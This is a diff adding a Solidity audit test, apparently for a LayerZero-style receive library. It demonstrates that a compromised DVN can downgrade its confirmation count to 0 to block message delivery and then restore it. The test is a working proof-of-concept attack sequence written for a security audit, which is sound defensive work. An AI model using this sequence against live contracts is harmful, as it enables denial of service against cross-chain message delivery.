@@ -123,6 +123,47 @@ contract SignatureReplayTest is AuditBase {
         // to be compromised, which is already a trust assumption.
     }
 
+    // ==================== AV2.2b: Confirmation Downgrade Blocks Delivery ====================
+    /// @dev A compromised DVN can block message delivery by re-verifying with 0 confirmations.
+    ///      Since verify.selector bypasses usedHashes, the DVN can call verify() unlimited times.
+    ///      _verify() unconditionally overwrites the Verification struct, so the DVN's
+    ///      confirmation count drops from high to 0, making _checkVerifiable fail.
+    function test_AV2_2b_ConfirmationDowngradeBlocksDelivery() public {
+        // Step 1: DVN verifies legitimately with 20 confirmations
+        Packet memory packet = _makePacket(1, address(this), address(this), "important");
+        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);
+
+        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 20);
+
+        // Step 2: Verify the message IS verifiable with 20 confirmations
+        UlnConfig memory config = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
+        bytes32 headerHash = keccak256(header);
+        bool verifiableBefore = dstReceiveUln.verifiable(config, headerHash, payloadHash);
+        assertTrue(verifiableBefore, "Should be verifiable with 20 confirmations");
+
+        // Step 3: Compromised DVN re-verifies with 0 confirmations (downgrade attack)
+        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);
+
+        // Step 4: Message is no longer verifiable — delivery blocked
+        bool verifiableAfter = dstReceiveUln.verifiable(config, headerHash, payloadHash);
+        assertFalse(verifiableAfter, "Delivery BLOCKED: confirmations downgraded to 0");
+
+        // Step 5: commitVerification reverts with LZ_ULN_Verifying
+        vm.expectRevert(abi.encodeWithSignature("LZ_ULN_Verifying()"));
+        _commitVerification(dstReceiveUln, header, payloadHash);
+
+        // Step 6: But the DVN can "restore" by re-verifying with high confirmations
+        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 20);
+        bool verifiableRestored = dstReceiveUln.verifiable(config, headerHash, payloadHash);
+        assertTrue(verifiableRestored, "DVN can restore verification by re-verifying");
+
+        emit log("CONFIRMED: DVN can toggle message deliverability via confirmation downgrade");
+        emit log("1. DVN verifies with 20 confirmations (message deliverable)");
+        emit log("2. DVN re-verifies with 0 confirmations (delivery BLOCKED)");
+        emit log("3. DVN re-verifies with 20 again (delivery restored)");
+        emit log("Impact: Compromised DVN can selectively DoS any message it has verified");
+    }
+
     // ==================== AV2.3: usedHashes Reset on Failure ====================
 
     /// @dev When execute() fails, usedHashes[hash] is reset to false
